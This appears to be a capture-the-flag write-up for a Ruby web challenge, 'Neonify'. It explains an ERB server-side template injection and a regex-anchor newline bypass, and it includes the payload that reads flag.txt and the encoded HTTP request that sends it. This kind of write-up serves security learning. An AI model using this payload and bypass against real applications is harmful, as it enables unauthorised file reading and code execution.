---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Neonify

It is a ruby app that accepts input and prints it.

## Server Side Template Injection

Clerly, there is a possiblity to do template injection.

Controller

```
  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
```

Template

```
<h1 class="glow"><%= @neon %></h1>
```

If I am able to upload a payload like `<%= 7 * 7 %>` it would execute and write `49`. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---basic-injections

### Regex filtering bypass

However, the input is checked using regex.

```
if params[:neon] =~ /^[0-9a-z ]+$/i
```

But there is a bug. In many implementations (ruby included) the `^` and `$` match newline (if not explicitly set to multiline). Meaning, if i send payload like:

```
<%= File.open('flag.txt').read %>
Pwned
```

It will pass the check and execute the code. So I just use CyberChef to encode it for me.

```
POST / HTTP/1.1
Host: 167.172.62.51:32066

neon=%3C%25%3D%20File%2Eopen%28%27flag%2Etxt%27%29%2Eread%20%25%3E%0APwnd
```

And receive the flag.